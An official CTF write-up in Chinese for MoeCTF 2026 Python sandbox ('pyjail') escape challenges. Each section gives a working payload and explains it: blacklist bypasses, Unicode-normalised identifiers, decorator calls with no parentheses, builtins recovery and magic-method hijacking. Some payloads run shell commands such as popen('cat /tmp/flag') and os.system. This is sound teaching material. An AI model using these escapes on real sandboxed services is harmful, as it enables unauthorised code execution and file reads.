# MoeCTF 2026 SandBox Official Write Up

## 前置知识
请查阅[入门指北](../../challenges/sandbox/ez_ban_ja1l/入门指北.md)

此外，使用 `nc` or `ncat` 命令连接到题目服务器时，实际上是启动了一个在服务器上运行的特殊 Python 程序（即题目源码）。`nc` or `ncat` 在此充当了一个网络桥梁，它将你本地终端里的输入，直接传递给了服务器上那个 Python 程序的标准输入流 (`input()` 函数)；同时，也将该程序的标准输出流 (如 `print` 的结果) 返回给你的终端。

因此，你看到的提示符“Give me your code:”和后续的交互，都发生在这个远程的 Python 程序进程中。

## 目录

- [ez_ban_ja1l](#ez_ban_ja1l)
- [e2_ban_jail](#e2_ban_jail)
- [3z_ban_jail](#3z_ban_jail)
- [ez_b4n_jail](#ez_b4n_jail)
- [Three](#three)
- [equals](#equals)
- [mathmagic](#mathmagic)
- [CleanHacker](#cleanhacker)
- [Parens? No!](#parens-no)
- [only_open](#only_open)
- [CatBox](#catbox)
- [Parens? No! Revenge!](#parens-no-revenge)
- [Pyjail笑传之CallingComesBack](#pyjail笑传之callingcomesback)
- [双十一](#双十一)
- [永不消逝的数字](#永不消逝的数字)
- [revenge_jail](#revenge_jail)
- [CatBox_revenge](#catbox_revenge)
- [Undefined](#undefined)
- [density](#density)
- [registers](#registers)

## 验证码脚本
```python
from pwn import *
import re

HOST = '127.0.0.1'
PORT = 1437
remote_on = True
p = remote(HOST,PORT) if remote_on else process(['python','./wrapper.py'])

def check() -> None:
    data = p.recvuntil(b'continue: ').decode()
    if '+' in data:
        pattern = r"'([^']+)'\+'([^']+)'"
        matches = re.search(pattern,data)
        s1 = matches.group(1)
        s2 = matches.group(2)
        answer = s1 + s2
    elif 'reverse' in data:
        pattern = r"'([^']+)'"
        matches = re.search(pattern,data)
        org = matches.group(1)
        answer = org[::-1]
    else:
        log.failure('Bad Send')
        return
    p.sendline(answer.encode())
    log.success(f'Send {answer}!')

if remote_on:
    check()
```

此处讲解下这个验证码脚本。  

`pwntools` 是一个专门为 CTF 设计的 Python 库, 方便 CTFer 自动化处理网络连接题目。  

脚本中的 `from pwn import *` 便是从 `pwntools` 这个库中导入所有工具, 引入了很多我们方便使用的 `function` 和 `class`。  

我们重点讲讲这里的网络交互处理
`p = remote(HOST,PORT)` 创建了一个远程连接对象，同时我们把这个对象赋予了一个简单的名字 `p`, 方便我们后续写代码。此后所有的发送，接收数据，我们只需要对 `p` 这个对象进行操作即可。  

`p.recvuntil(b'continue: ')` 这一行会让脚本一直接收远程发送过来的数据，直到遇到我们给他的模式字符串，这里是 `continue: ` 为止。这一行的 `b` 前缀表示这是一个字节串 (`bytes`) 类型, 因为接收发送的原始数据都是字节的形式。`p.recvuntil` 的返回值自然也就是字节串形式，因此要转回字符串，我们需要对他进行 `decode()` 处理。  

`p.sendline` 这一行便是发送数据，它会在我们提供给它的数据后自动加上一个换行符 `\n`，等同于我们的回车操作。  

此外，接收，发送数据还有很多别的函数，我们不多赘述。  

再提一下这里的 `log` 对象，其 `log.info` , `log.faliure` , `log.success` 等等函数都用于日志功能，比 直接使用`print` 函数更加美观，方便我们查看各种信息。  

`re` 是 Python 用于处理正则表达式的模块，这里我们使用 `re` 方便我们直接从原始数据中获取想要的对象，而不用逐个处理，对于正则表达式的一些知识，此处讲解过多回过于冗长，因此，我们附上一个[菜鸟教程](https://www.runoob.com/python/python-reg-expressions.html)，自行了解。  

后续的验证码脚本就不再次介绍，在一些不方便手动输入payload的情形下我们将采取此脚本。

## ez_ban_ja1l

### Info
分数 : 50 pts  
出题人 : starwalking  
题目路径 : [ez_ban_ja1l](../../../challenges/sandbox/ez_ban_ja1l/)  

### Payload

```py
print(__builtins__.__dict__['__imp'+'ort__']('o'+'s').popen('cat /tmp/flag').read())
```

### Explain

限制有且仅有字符串黑名单，我们将[入门指北](../../challenges/sandbox/ez_ban_ja1l/入门指北.md)提到过的一个payload（如下）进行变形。
```python
__import__('os').system('whoami')
```

对于这个payload的更改我们需要绕过的有几个方面。
1. `os` 字符串被检测
我们可以用 `'o' + 's'` 进行绕过。
2. `system` 字符串被检测
换一个函数即可，此处我们采取 `print()` 和 `popen(cmd).read()` 的组合。
3. `import` 字符串被检测  
我们从 `__builtins__.__dict__` 中取出来`__import__` 这个内置函数即可。

这里说明下 `__builtins__`。  
`__builtins__` 是 Python 中存储所有内置函数和对象的模块，其 `__dict__` 属性便是所有内置函数和对象的一个字典。  
拿到这个字典我们从中再次利用字符串拼接的方法取出 `__import__` 即可。  

## e2_ban_jail

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [e2_ban_jail](../../challenges/sandbox/e2_ban_jail/)  

### Payload

```python
c=ord(' ');exec('bre'+chr(ord('A')+c)+'k'+chr(ord('P')+c)+'o'+chr(ord('I')+c)+'nt()')
```

### Explain

依旧是字符黑名单，限制了 `pyjail` 这6个字符和所有数字。  

对于字符的绕过是简单的，我们能看到`chr`, `ord` 这两个函数没有被禁用，所以我们可以采取 `ord` 去从字符获取数字，用 `chr` 从数字获取字符。  

这里我们讲讲顺便获取数字的另一个操作，利用 `bool` 类型。  

Python 中的 `bool` 类继承自 `int` 类，这里我们查看 `bool.__doc__` 即可得知。  

```text
Returns True when the argument is true, False otherwise.
The builtins True and False are the only two instances of the class bool.
The class bool is a subclass of the class int, and cannot be subclassed.
```  

因此，`bool` 类可以替代数字, `True` 可以当作 1 使用。
对于一个数字，比如32，我们就可以采取如下获取方式。  

```python
c = True + True # c = 2
c = (c * c + True) * c # c = 32
```

## 3z_ban_jail

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [3z_ban_jail](../../challenges/sandbox/3z_ban_jail/)  

### Payload

```python
𝒃𝒓𝒆𝒂𝒌𝒑𝒐𝒊𝒏𝒕()
```

### Explain

本题利用 `re` 模块禁用了所有在 **ASCII** 表中的英文字母和数字字符。

看似我们好像束手无策了，但我们需要注意 Python 实际非常宽容。  

查阅 [pep 3131](https://peps.python.org/pep-3131/) 得知

```text
All identifiers are converted into the normal form NFKC while parsing; 
comparison of identifiers is based on NFKC.
```

Python 解释器会在解析街道将所有标识符转化成 **NFKC** 规范形式  

因此采取使用 **ASCII之外** 的字母即可成功利用  

我们选用最简单的 `breakpont()` 函数即可  

## ez_b4n_jail

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [ez_b4n_jail](../../challenges/sandbox/ez_b4n_jail/)  

### Payload

```python
getattr(getattr(__builtins__,'__import__')('o''s'),'sy''stem')('whoami')
```

### Explain

这里我们遇到了全新的东西 —— `ast`。  

`ast`, Abstract Syntax Tree(抽象语法树) 可以将代码抽象成一颗由节点组成的树，每个节点是一个语法结构，比如：赋值，函数，常量，二元运算等等。 

以下给一个代码示例。
```python
import ast

src = "x = 1 + 2"
tree = ast.parse(src)

print(ast.dump(tree,indent=4))
```

输出为

```text
Module(
    body=[
        Assign(
            targets=[
                Name(id='x', ctx=Store())],
            value=BinOp(
                left=Constant(value=1),
                op=Add(),
                right=Constant(value=2)))])
```

源码中采取 `ast` 这个模块去静态解析代码，目的正是为了从这个结构中去禁用一些更深层次的操作。  

源码禁用了`ast.Import` 和 `ast.ImportFrom`。
其实就是禁止了`import <module>` 和 `from <module> import <something>` 这样直接 `import` 的操作。
但是这两个操作背后调用的都是 `__import__` 这个内置函数。  
而使用 `__import__` 是不算被禁用的 `ast` 节点的。  

因此 ez_ban_ja1l 的代码依旧是一个助力，不过这里我们换个方式，采取 `getattr` 函数，这个函数原型为 `getattr(x,'y')` 用于获取 x 对象的 y 属性，`x.y` 就相当于 `getattr(x,'y')`。  

逃逸途径是差不多的，不过 `getattr` 相对于直接访问属性会多一个优势，绕开 `ast.Attribute`，遇到禁用 `ast.Attribute` 的题目时会是一个很好的帮手  

## Three

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [Three](../../challenges/sandbox/Three/)  

### Payload

```python
exp = "c=201;\teval (\t input(1\t)+\'#1\')"
```

无空格制表符版本
```python
c=201;abc=exec(input(13)+'#1')
```

无注释版本
```python
c=201;cb=[exec(input(13))]and{13}
```

### Explain

对于这道题的限制，我们线尝试获取可能有用的函数。写个脚本遍历内置函数  
```python
def check3(code : str) -> bool:
    if len(code) == 0:
        return True
    if len(code) < 3:
        s = set()
        for i in code:
            s.add(ord(i) % 3)
        return len(s) == len(code)
    a,b,c = map(lambda x : ord(x) % 3,code)
    return len({a,b,c}) == len(code)

def check(code : str) -> list[int]:
    offset = 0
    ans = [0,1,2]
    while offset < 3:

        if not check3(code[0:offset]):
            ans.remove(offset)
            offset += 1
            continue

        for i in range(offset,len(code),3):
            if not check3(code[i:i+3]):
                ans.remove(offset)
                break
        offset += 1
    return ans

for i in dir(__builtins__):
    a = check(i)
    if len(a) == 0:
        continue
    print(f'{i} {a}')
```

得到结果

```text
BytesWarning [0]
Warning [1]
abs [1, 2]
aiter [0]
all [2]
any [1, 2]
bin [1, 2]
chr [1, 2]
credits [1]
delattr [2]
dict [2]
dir [2]
eval [2]
exec [2]
exit [2]
globals [2]
hash [2]
help [1]
hex [1]
id [0, 1, 2]
input [0, 1, 2]
int [2]
iter [2]
len [2]
list [1]
max [1]
min [0, 1, 2]
object [2]
oct [1]
open [0]
ord [1]
pow [0, 1, 2]
property [2]
quit [2]
range [0]
repr [0, 1, 2]
reversed [0]
set [2]
str [0, 1, 2]
sum [1, 2]
super [1, 2]
tuple [0, 2]
type [2]
zip [0, 1, 2]
```

注意到 `exec` 和 `eval` 都存在于可用列表之中，而且 `input` 也可以利用，甚至是任意位置。因此我们得到了本题最简单的一个逃逸路径 `eval / exec` + `input` 的逃逸组合。剩下的就是构造一些垃圾值去绕开检查即可。

just a game jail.

## equals

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [equals](../../challenges/sandbox/equals/)  

### Payload

```python
breakpoint()#00000000000000000000000000000000000000000000A
```

### Explain

本题依旧是一个 game jail。限制也不难，利用注释符填充垃圾数值，我们写个脚本过即可。

```python
def solve(cmd:str,base:str) -> str:
    cmd += '#'
    l = len(cmd)
    s = sum(ord(c) for c in cmd)
    score = ord(base)
    count = 0
    while l ** 2 < s:
        l += 1
        s += score
        count += 1
    try:
        tail = chr(ord(base) - (s - l * l))
        return cmd + (count - 1) * base + tail
    except ValueError as e:
        print(e)
        return 'No'
```

## mathmagic

### Info
分数 : 100 pts  
出题人 : starwalking  
题目路径 : [mathmagic](../../challenges/sandbox/mathmagic/)  

### Payload

```python
from pwn import *
import re

remote_on = True
HOST = '127.0.0.1'
PORT = 1437
p = remote(HOST,PORT) if remote_on else process(['python','wrapper.py'])

def check():
    data = p.recvuntil(b'continue: ').decode()
    if '+' in data:
        pattern = r"'([^']+)'\+'([^']+)'"
        matches = re.search(pattern,data)
        s1 = matches.group(1)
        s2 = matches.group(2)
        answer = s1 + s2
    elif 'reverse' in data:
        pattern = r"'([^']+)'"
        matches = re.search(pattern,data)
        org = matches.group(1)
        answer = org[::-1]
    else:
        log.failure('Bad Send')
        return
    p.sendline(answer.encode())
    log.success(f'Send {answer}!')

if remote_on:
    check()

class Random:
    _P = 1000000021
    _A = 320560990
    _BASE = 123456789 % _P
    def __init__(self, seed=0):
        self.state = (self._BASE * pow(self._A, seed % 60, self._P)) % self._P

    def random(self, mod):
        self.state = (self.state * self._A) % self._P
        return self.state % mod + 1

MOD = 15
PAYLOAD = """[x:=[a
for
a
in
().
__class__.
__base__.
__subclasses__
()
if
a.
__name__==
'_wrap_close'
][0].
__init__.
__builtins__
,
__builtins__.
update(x),
breakpoint()
]"""

dic = {}


for i in range(60):
    r = Random(i)
    gift = [r.random(MOD) for _ in range(3)]
    dic[str(gift)] = i

p.recvuntil('gift:\n')
data = p.recvline().decode().strip()
index = dic[data]
log.info(f'Index Recovered : {index}')

r = Random(index)
for _ in range(3) : r.random(MOD) # ignore

payload = PAYLOAD.split('\n')
for pay in payload:
    a = r.random(MOD)
    while len(pay) > a:
        p.sendlineafter(b'>> ',b'#'*a)
        a = r.random(MOD)
    p.sendlineafter(b'>> ',pay.ljust(a,'#').encode())

p.sendline(b' ')
p.interactive()
```

### Explain

需要一点注意力，这个随机数系统并不是很随机，稍微运行一下就会发现，它实际只有60种可能。而且给出的 `gift` 序列足够我们反推出种子，剩下利用注释符填充垃圾值即可。

当然，其实不注意到也行，因为随机数初始种子是利用 `time.time()` 生成的。所以稍微调整一下时间上的偏移，就能获得和服务端一样的种子。  

只是一个脚本练习题。

## CleanHacker

### Info
分数 : 150 pts  
出题人 : starwalking  
题目路径 : [CleanHacker](../../challenges/sandbox/CleanHacker/)  

### Payload

```python
global admin
try:e
except NameError as admin:1
```

### Explain

分析一下源码，限制如下:
1. 代码长度限制在50个字符
2. 只允许一些特定字符  
3. 禁用了 `ast.Delete`, `ast.Attibute` , `ast.Call`

需求是什么，删除 `admin` 这个变量  
想一些传统的删除手段
1. `del admin`
这不行，会遇到 `ast.Delete` 的封锁  
2. `globals().pop('admin')`
这也不行，同时遇到 `ast.Call` 和 `ast.Attribute` 的封锁 

但我们去查阅 [pep 3110](https://peps.python.org/pep-3110/)

会发现 Python 在 try-except 并非我们看到的那样，Python在解释下面这样一个 try-except 块时
```python
try:
    try_body
except E as N:
    except_body
```
实际会翻译成
```python
try:
    try_body
except E as N:
    try:
        except_body
    finally:
        del N
```

这里正是我们需要的删除语句，我们便可以用这个变量绑定机制去删除 `admin`。
为了最短化代码，我们采取 `NameError` 引发异常。


## Parens? No!

### Info
分数 : 150 pts  
出题人 : starwalking  
题目路径 : [Parens? No!](../../challenges/sandbox/ParensNo/)  

### Payload
第一次提交  
```python
del __builtins__
```

第二次提交  
```python
@exec
@lambda x : 'breakpoint\x28\x29'
class X:pass
```

### Explain

分析源码，本题禁用了三种类型的括号，提供的 `__builtins__` 是一个空模块，没有可以利用的函数  

查阅 Python 官方文档关于 `exec` 函数的 [描述](https://docs.python.org/zh-cn/3/builtins/functions.html#exec)，我们注意到以下一段话  
```text
If the globals dictionary does not contain a value for the key __builtins__, a
reference to the dictionary of the built-in module builtins is inserted under
that key. Overriding __builtins__ can be used to restrict or change the
available names, but this is not a security mechanism: the executed code can
still access all builtins.
```
Python 在执行 `exec(source, global_dict, local_mapping) ` 时如果传入的 `global_dict` 没有 `__builtins__` 这个键，那么会对该键插入 `__builtins__` 模块字典的一个引用。

因此，我们可以第一次可以进行`del __builtins__` ，再第二次 `exec` 的时候，我们就成功获取了 `__builtins__`。  

接着，我们只需要在没有括号的情况下，执行函数即可，此处我们采取装饰器逃逸。  

有关装饰器，我们继续查看这篇[菜鸟教程](https://www.runoob.com/w3cnote/python-func-decorators.html)吧

下面这段代码  
```python
@dec1
@dec2
def func():pass
```

本质如下
```python
def func:pass
func = dec1(func)
func = dec2(func)
```

利用这一点，我们可以这样做
```python
def func:pass
func = input(func)
func = exec(func)
```

在 `func = input(func)` 后，`func` 对象就变成字符串了，且会被 `exec`执行，那么输入一个 `breakpoint()` 也好,`__import__('os').system('sh')` 也好，都足够我们逃出来了  
## only_open

### Info
分数 : 150 pts  
出题人 : starwalking  
题目路径 : [only_open](../../challenges/sandbox/only_open/)  

### Payload

```python
open(*open('/tmp/flag'))
```

### Explain

本题只给了一个 `open` 函数  
同时把 `_`, `.` 用于继承链逃逸的典型字符给禁用了，这不是一个好消息  
但我们要发现的是 `open` 在以 `text mode` 打开文件的情况下，返回的是一个可迭代对象，用 `*` 去解包即得到文件内容。  

而我们已知flag位置的情况下，我们就可以利用这个特性去获取flag的内容到我们的python程序中，接下来就是泄露这个值。  

open一个不存在的文件时，会引发一个 `FileNotFoundError` 异常，同时告诉我们刚刚什么没有被找到。我们将flag的内容作为文件名去open，这样就可以利用这个异常特性，通过异常泄露出flag的值。  

## CatBox

### Info
分数 : 200 pts  
出题人 : starwalking  
题目路径 : [CatBox](../../challenges/sandbox/CatBox/)  

### Payload

```python
from pwn import *
import base64
import re

HOST = '127.0.0.1'
PORT = 1437
remote_on = False
p = remote(HOST,PORT) if remote_on else process(['python','./wrapper.py'])

def check():
    data = p.recvuntil(b'continue: ').decode()
    if '+' in data:
        pattern = r"'([^']+)'\+'([^']+)'"
        matches = re.search(pattern,data)
        s1 = matches.group(1)
        s2 = matches.group(2)
        answer = s1 + s2
    elif 'reverse' in data:
        pattern = r"'([^']+)'"
        matches = re.search(pattern,data)
        org = matches.group(1)
        answer = org[::-1]
    else:
        log.failure('Bad Send')
        return
    p.sendline(answer.encode())
    log.success(f'Send {answer}!')

if remote_on:
    check()

name = b"__builtins__b.exec(b.input('>>'),{'__builtins__':b})"
exp = "[b:=cat._＿init＿_._＿globals＿_[cat.name[:12]],[[]for[cat._＿class＿_._＿getitem＿_]in[[b.exec]]],i:=b._＿import＿_,p:=cat[cat.name[12:]]]".encode()
p.sendlineafter(b'name:',name)
p.sendlineafter(b'Action: ',exp)
p.sendlineafter(b'>>',b'breakpoint()')
p.interactive(prompt='')
```

### Explain

分析源码，题目只给我们了一个 `Cat` 类的实例 `cat`。
同时禁止了 `'`,`"`,`__`,` `,`(`,`)`。  
代码将在 `eval` 环境进行执行。

注意到，我们在 `eval` 环境是无法执行类似赋值的代码的，比如下面的代码。
```python
code = 'x = 1'
eval(code)
```

会报错 `SyntaxError`。这是因为 `eval` 只能执行一个表达式，不能执行一个语句块/代码块。因此要想在 `eval`里面赋值需要另辟蹊径。

Python 3.8 引入了一个特性 —— 海象表达式，海象表达式允许在一个**表达式**中进行赋值和返回值，从而简化代码。表达式赋值，正是我们需要的。我们这里就可以采取**列表**加**海象表达式**的组合来将多个语句转换成单一的表达式，这点在后续的构造中大有助力。

禁用了单引号`'`,双引号`"`,导致我们获取字符串会比较困难，但我们可以发现的是`cat.name` 是一个字符串对象，而且其初始值是由我们输入的，因此可以用它来获取任意字符串。  

过滤了 `__` 双下划线看似禁止了我们利用魔术方法导致的继承链逃逸，但是回顾 `3z_ban_jail` , 在那道题中我们学会了 `NFKC` 规则，我们同样可以利用这一点来绕过双下划线的过滤。

而针对括号的过滤如何解决呢，没有括号我们在 `eval` 环境该如何调用函数。  

这一点我们可以利用 Python 的魔术方法来进行绕过  

对于如下 Python 代码
```python
arr[index]
```

本质实际是  

```python
type(arr).__getitem__(arr,index)
```

这里需要注意的一点是，`__getitem__` 的第一个参数 `self` 是传入的对象 `arr` 本身，这是由于 Python 类的对象机制导致的，类的普通函数会触发该机制，但是用装饰器 `@staticmethod` 的函数以及内置函数并不会触发该机制  

空格的绕过是简单的，利用 `\t` 制表符绕过即可。不过我们的payload并没有采取这个绕过方式。而是选择了另外一种，for循环的unpacking用法。  

Python 的 for 循环后面不一定非要写一个变量名，可以写一个模式，遵从对应的赋值规则即可,例如  

```python
for (a,b) in [(1,2),(3,4)] : print(a,b) # 元组
for [a,b] in [[1,2],[3,4]] : print(a,b) # 列表
for [x] in [[1],[2]] : print(x) # 单元素也可以
```

只要左边和右边的结构式能对的上，Python 会自己拆包赋值  

我们这里采取的正是这样的语法  
```python
for [x] in [[data1],[data2]]:pass
```

这一个过程，右侧我们取出了 `list` 的第一个元素 `[data1]`，赋值时遵循
```python
[x] = [data]
```

左边和右边的结构式一致的，对上了，两边都拆开括号，即完成了 `x = data` 这一个过程。

接着就是继承链逃逸了，我们利用 `cat` 来获取`__builtins__`  

`Cat` 类中存在函数对象，而里面的函数对象会带一个属性`__globals__`,指向当前模块的全局命名空间字典，因此我们可以获取其中的 `__builtins__` 来恢复`__builtins__`。  

可以自己尝试下面的代码
```python
cat.__init__.__globals__ is globals() # True
```

将上述知识点串起来便得到了我们最终的payload  

## Parens? No! Revenge!

### Info
分数 : 300 pts  
出题人 : starwalking  
题目路径 : [Parens? No! Revenge!](../../challenges/sandbox/ParensNo/)  

### Payload

```python
__builtins__.__build_class__ = lambda *x : 1
@"".__class__.__class__.__subclasses__
@lambda x : "".__class__.__base__
class X:pass
b = None
for c in X:b = b if c.__name__ != '_wrap_close' else c
@__builtins__.__dict__.update
@lambda x:b.__init__.__builtins__
class Y:pass
help.__class__.__add__ = exec
help + "breakpoint\\50\\51"
```

### Explain

这次我们被只允许执行一次代码了，也就是说 `del __builtins__` 这一招失效了，我们无法获得一个有效的对象让我们修改它的魔术方法  

回想先前的题目，我们可以用之前装饰器逃逸的想法，毕竟装饰器不止可以用于函数，一样可以用于类,类的基础定义是不需要括号的。

但我们像采取建立一个 `class` 时，会发现报错  

```text
NameError: __build_class__ not found
```

查询可知，`__build_class__`函数是Python中一个比较底层的内置函数，它用于在构造类时创建类对象。

没有这个内置函数就很难办了呀，毕竟类都建立不起来，怎么讨论装饰器逃逸呢。  

但我们需要注意到的时，`class` 的建立，看的只是这个函数在不在，`__name__` 在不在，我们采取装饰器逃逸了，并不需要这个 `class` 真的是一个 `class` 对象，因此我们采取定义这个函数，只要能让 `class X:pass` 这一行代码跑起来就行。

接下来，我们尝试恢复 `__builtins__`。

这里我们尝试拿取`os._wrap_close` 类，拿到的前提是获取 `object` 的所有子类，也就是执行`object.__subclasses__()`。但这个函数是无参的，利用装饰器，我们实现的是一参函数的调用。  

但需要注意的是，前文在 `CatBox` 的逃逸时，我们提到的 Python 绑定机制。
我们真正执行 `object.__subclasses__()` 的时候，本质是 `type(object).__subclasses__(object)`。  
这就有趣了，我们想要的一参函数获取子类列表就这样子出现了，而`type(object)` 是什么呢，正是`type`。而 `type` 是容易获取的 `"".__class__.__class__` 即可。  

于是我们采取如下方式恢复`__builtins__`  

```python
__builtins__.__build_class__ = lambda *x : 1
@''.__class__.__class__.__subclasses__ # type.__subclasses__
@lambda x : ''.__class__.__base__ # lambda x: object
class X:pass
```

在执行这几行代码过后，`X` 就是 `object` 的所有子类列表。

但问题是，我们并不知道 `os._wrap_close` 类在哪个位置。我们不知道的情况下可以采取如下方式进行获取。

```python
b = None
for c in X:
    if c.__name__ == '_wrap_close':
        b = c
```

此时，如果 `os._wrap_close` 类是存在的，那么 `b` 就是 `os._wrap_close` 类。
但我们需要注意的是，源代码对输入进行了 `strip()` 处理，这让我们无法使用任何缩进语句，而 Python 中的 `for` 循环虽然后面可以紧跟一个 expression，如下：
```python
for i in arr : <expression>
```

但要求这个 expression 是一个简单语句，而如下的代码
```python
for c in X : if c.__name__ == '_wrap_close':b = c
```

for循环后面跟着的是一个条件判断语句，并非是一个简单语句，执行这行代码，会报错 `SyntaxError`。  

而赋值语句是一个简单语句，为什么我们要提到赋值语句呢，因为引申的条件赋值语句  
```python
a = op1 if condition else op2
```
是一个简单语句，因此我们可以利用这一点来进行绕过。  

接着就是再次利用装饰器用得到的`os._wrap_close` 中拿到的 `__builtins__` 更新 `__builtins__`，回到 `Parens? No! ` 的做法即可。

## Pyjail笑传之CallingComesBack

### Info
分数 : 300 pts  
出题人 : starwalking  
题目路径 : [Pyjail笑传之CallingComesBack](../../challenges/sandbox/Pyjail笑传之CallingComesBack/)  

### Payload

```python
[+help for help.__class__.__pos__ in[breakpoint]]
```

### Explain

分析一下限制，50个字符以内，禁用`ast.Call`  
禁用 `ast.Call` 这点我们轻车熟路了，替换魔术方法即可。  
类似 `help.__class__.__getitem__ = exec` ，接着 `help['breakpoint()']` 即可，但由于50长度的限制，这么些肯定不行了。  
但替换 `__getitem__` 使用的是一参函数，为什么我们不能直接一步到位呢，无参函数调用`breakpoint()`。  
分析魔术方法，我们可以知道一些一元运算符是可以来进行无参函数调用，譬如 `__pos__` 魔术方法，对于 `+obj` 这类操作。  
实际是 `type(obj).__pos__(obj)`，对象本身已经占用 `self` 这个参数了，自然就变成无参函数调用了。  

为了简化代码的操作，我们采取列表推导式的解法，赋值后即可直接进行我们的无参函数调用了。实际上，想用海象表达式也不行，海象表达式不支持属性赋值。类似如下的操作  
```python
[help.__class__.__pos__:=breakpoint]
```

会报错`SyntaxError: cannot use assignment expressions with attribute`

## 双十一

### Info
分数 : 300 pts  
出题人 : starwalking  
题目路径 : [双十一](../../challenges/sandbox/双十一/)  

### Payload

```python
vars(
    vars()[
        [*vars()][
            ([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])
        ]
    ]
)[
    [*vars(
        vars()[
            [*vars()][
                ([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])
            ]
        ]
    )][
        ([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])
    ]
]()
```

ps : 此处稍微排版方便阅读，实际提交时无空格，无换行

### Explain

分析下源码，源码允许我们最多使用3类字符，每类最多4种字符，共计最多11种字符。  
我们先确定什么需要哪3类。  
首先小写字母和括号是最为重要，先锁定它两位置。剩下的我们从之前题目学到过，由于 `bool` 类可以作为数字使用，那么选取运算符，我们只需要 `==` 配合一下啊，就可以构造出 `True`，获取数字 1，利用 `+` 即可构造任意正整数，因此数字类被我们 `pass`，而大写字母和运算符类相比较，大写字母显然就可以被我们排除了。  
我们最终选择三类字符，运算符，括号和小写字母。小写字母最多只能使用4种，我们写个脚本遍历一下内置函数，确定什么函数可以供我们利用。

```python
for c in __builtins__.__dict__:
    s = set(str(c))
    if len(c) <= 4 and all(cc.islower() for cc in c):
        print(c)
```  

得到结果  
```text
abs
all
any
bin
chr
dir
eval
exec
hash
hex
id
iter
len
max
min
next
oct
ord
pow
repr
sum
vars
bool
dict
int
list
map
set
str
type
zip
open
quit
exit
help
```

值得注意的是，我们发现 `help` 可以用，但是由于题目环境的原因，这里使用 `help` 不会打开分页器，于是我们无法通过这一点进行逃逸，只能从剩下的函数找一些可以被利用的东西。  

我们回顾入门指北，提到过一个重要的函数用来探测环境 —— `vars`。我们用 `print(vars.__doc__)` 看看它的文档。  

```text
vars([object]) -> dictionary

Without arguments, equivalent to locals().
With an argument, equivalent to object.__dict__.
```

注意到 `vars` 无参使用的时候，等价于使用 `locals`。而题目采取 `eval(user_input,globals())` 执行，此时执行 `locals` 又等价于执行 `globals()` 因此本题的 `vars` 即可当作 `globals()` 使用。我们只需构造出使用 `globals()['__builtins__']['breakpoint']()`即可成功逃逸。  

我们在 `only_open` 中学到过一个运算符 `*` 用来解包，对于字典，使用 `*dic` 的语法取出的其实是所有 `key`，于是我们可以采取 `[*vars()]` 的方式来获取所有 `key` 构成的一个 `list`。  

这个时候取出 `key` 就很简单了。我们采取 `[] == []` 和 `+` 利用 `bool` 类构造数字即可。  
取出`__builtins__` 后，我们再利用 `vars` 的带参数使用方法 `vars(__builtins__)` 重复一次上述构造过程即可成功调用 `breakpoint()` 进入调试状态，从而逃逸成功。  

## 永不消逝的数字

### Info
分数 : 300 pts  
出题人 : starwalking  
题目路径 : [永不消逝的数字](../../challenges/sandbox/永不消逝的数字/)  

### Payload

```python
help.__call__.__code__.co_firstlineno**exit.__init__.__code__.co_firstlineno*exit.__call__.__code__.co_nlocals+type.__basicsize__**re._parser.parse_template.__code__.co_stacksize*exit.__init__.__code__.co_firstlineno+bytes.__basicsize__*re._compiler.compile.__code__.co_stacksize*re._compiler.compile.__code__.co_stacksize**int.__basicsize__+re.enum._is_dunder.__code__.co_firstlineno//exit.__call__.__code__.co_nlocals*re._compiler.compile.__code__.co_stacksize*re._compiler.compile.__code__.co_stacksize**re.copyreg.constructor.__code__.co_firstlineno+memoryview.__weakrefoffset__**re._compiler.compile.__code__.co_stacksize*int.__itemsize__*re._compiler._get_charset_prefix.__code__.co_nlocals+int.__basicsize__*exit.__repr__.__code__.co_firstlineno*re.split.__code__.co_nlocals*re._compiler.compile.__code__.co_stacksize**exit.__repr__.__code__.co_firstlineno+re._parser.parse_template.__code__.co_stacksize*re._compiler.compile.__code__.co_stacksize**object.__basicsize__+exit.__call__.__code__.co_firstlineno*re._compiler.compile.__code__.co_stacksize**exit.__init__.__code__.co_firstlineno+exit.__repr__.__code__.co_firstlineno*set.__basicsize__*re._compiler.compile.__code__.co_stacksize**re._compiler.compile.__code__.co_stacksize+exit.__repr__.__code__.co_firstlineno*re.escape.__code__.co_flags*re._compiler.compile.__code__.co_stacksize**re._compiler.compile.__code__.co_stacksize+re._compiler._get_charset_prefix.__code__.co_nlocals*int.__itemsize__*re._compiler.compile.__code__.co_stacksize**re.split.__code__.co_stacksize+zip.__flags__*help.__call__.__code__.co_firstlineno+-complex.__flags__*re._parser.parse_template.__code__.co_stacksize-check.__class__.__dictoffset__*int.__itemsize__*credits.__call__.__code__.co_nlocals-__debug__
```

### Explain

了解到函数具有 `__code__` 属性其中具有 `co_firstlineno`,`co_flags` 等属性可以提供数字  
`__debug__` 等调试可以提供数字  
`int.__basicsize__` 容量相关的属性可以提供数字  

利用这些数字我们去构造 `bytes_to_long(b'breakpoint')` 的值即可  

## revenge_jail

### Info
分数 : 400 pts  
出题人 : starwalking  
题目路径 : [revenge_jail](../../challenges/sandbox/revenge_jail/)  

### Payload

初始提交
```python
try:
    raise Exception
except Exception as e:
    my_builtins = None
    frame = None
    match e:
        case object(__traceback__=tb):
            match tb:
                case object(tb_frame=val):
                    frame = val
                    pass
    while frame:
        match frame:
            case object(f_code=fc):
                match fc:
                    case object(co_name=name):
                        if name=='chall':
                            match frame:
                                case object(f_globals=fg):
                                    match fg:
                                        case {'__builtins__': b}:
                                            my_builtins = b
                            break
        match frame:
            case object(f_back=fb):
                frame=fb
match my_builtins:
    case object(exec=val):
        my_exec = val

match my_builtins:
    case object(input=val):
        my_input = val

@my_exec
@my_input
def f():pass
```

进入input后提交
```python
my_exec(my_input('>> '),{'__builtins__':my_builtins})
```

再次进入input后提交
```python
breakpoint()
```

### Explain

本题是去年 `moectf2025` 中 `Pyjail5` 的复仇，用到了 `Pyjail5` 的思想。详情查看 [Pyjail5 Official Write Up](https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Misc/Writeup.md#pyjail-5)  

